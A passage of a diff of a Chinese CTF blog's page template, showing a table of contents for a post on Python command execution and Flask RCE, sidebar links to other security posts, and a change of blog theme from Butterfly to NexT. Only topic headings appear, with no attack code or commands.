的命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OS%E6%A8%A1%E5%9D%97"><span class="toc-text">OS模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#os-system"><span class="toc-text">os.system:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#os-popen"><span class="toc-text">os.popen:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subprocess%E6%A8%A1%E5%9D%97"><span class="toc-text">subprocess模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#subprocess-run"><span class="toc-text">subprocess.run:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subprocess-Popen"><span class="toc-text">subprocess.Popen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subprocess-getoutput"><span class="toc-text">subprocess.getoutput</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subprocess-check-output"><span class="toc-text">subprocess.check_output</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subprocess-call-%E5%8F%8Acheck-call"><span class="toc-text">subprocess.call() 及check_call()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#send-file"><span class="toc-text">send_file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval%E5%92%8Cexec"><span class="toc-text">eval和exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#commands"><span class="toc-text">commands</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctypes"><span class="toc-text">ctypes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#threading"><span class="toc-text">threading</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#multiprocessing"><span class="toc-text">multiprocessing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#posixsubprocess"><span class="toc-text">_posixsubprocess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pty"><span class="toc-text">pty</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#timeit"><span class="toc-text">timeit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#platform"><span class="toc-text">platform</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#importlib"><span class="toc-text">importlib</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys"><span class="toc-text">sys</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linecache"><span class="toc-text">linecache</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#builtins"><span class="toc-text">builtins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-RCE%E5%88%A9%E7%94%A8-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87"><span class="toc-text">Flask RCE利用(内存马篇)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#static-folder-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">static_folder 任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5"><span class="toc-text">路由注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-RCE%E5%88%A9%E7%94%A8-debug%E7%AF%87"><span class="toc-text">Flask RCE利用(debug篇)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E8%BE%85%E5%8A%A9%E5%B7%A5%E4%BD%9C"><span class="toc-text">一些辅助工作</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/02/AyaN0%E6%A1%91%E7%9A%84%E9%9B%86%E8%AE%AD%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/" title="AyaN0桑的集训阶段总结">AyaN0桑的集训阶段总结</a><time datetime="2025-08-02T05:02:44.000Z" title="发表于 2025-08-02 13:02:44">2025-08-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="CRLF注入漏洞">CRLF注入漏洞</a><time datetime="2025-07-14T10:47:04.000Z" title="发表于 2025-07-14 18:47:04">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/" title="刷题蛆来咯-CTFshow">刷题蛆来咯-CTFshow</a><time datetime="2025-07-07T06:19:38.000Z" title="发表于 2025-07-07 14:19:38">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗">114514分钟能了解SSRF吗</a><time datetime="2025-07-07T05:05:59.000Z" title="发表于 2025-07-07 13:05:59">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类">磨好的利剑:PHP原生类</a><time datetime="2025-07-01T05:58:51.000Z" title="发表于 2025-07-01 13:58:51">2025-07-01</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2688080408" data-server="netease" data-type="song" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
-  const destroyAplayer = () => {
-    if (window.aplayers) {
-      for (let i = 0; i < window.aplayers.length; i++) {
-        if (!window.aplayers[i].options.fixed) {
-          window.aplayers[i].destroy()
-        }
-      }
-    }
-  }
 
-  const runMetingJS = () => {
-    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
-  }
+    </div>
 
-  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
-  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
-})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
-  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+    
+    
+    
 
-  window.pjax = new Pjax({
-    elements: 'a:not([target="_blank"])',
-    selectors: pjaxSelectors,
-    cacheBust: false,
-    analytics: false,
-    scrollRestoration: false
-  })
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
+        <span>微信</span>
+      </div>
 
-  const triggerPjaxFn = (val) => {
-    if (!val) return
-    Object.values(val).forEach(fn => fn())
-  }
+  </div>
+</div>
 
-  document.addEventListener('pjax:send', () => {
-    // removeEventListener
-    btf.removeGlobalFnEvent('pjaxSendOnce')
-    btf.removeGlobalFnEvent('themeChange')
+          <div class="post-tags">
+              <a href="/tags/Web-CTF/" rel="tag"># -Web -CTF</a>
+          </div>
 
-    // reset readmode
-    const $bodyClassList = document.body.classList
-    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+        
 
-    triggerPjaxFn(window.globalFn.pjaxSend)
-  })
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/" rel="prev" title="详解XSS注入">
+                  <i class="fa fa-angle-left"></i> 详解XSS注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/" rel="next" title="HTML学习以及网页搭建初实践">
+                  HTML学习以及网页搭建初实践 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
 
-  document.addEventListener('pjax:complete', () => {
-    btf.removeGlobalFnEvent('pjaxCompleteOnce')
-    document.querySelectorAll('script[data-pjax]').forEach(item => {
-      const newScript = document.createElement('script')
-      const content = item.text || item.textContent || item.innerHTML || ""
-      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
-      newScript.appendChild(document.createTextNode(content))
-      item.parentNode.replaceChild(newScript, item)
-    })
 
-    triggerPjaxFn(window.globalFn.pjaxComplete)
-  })
 
-  document.addEventListener('pjax:error', e => {
-    if (e.request.status === 404) {
-      pjax.loadUrl('/404')
-    }
-  })
-})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">AyaN0</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">314k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">9:31</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
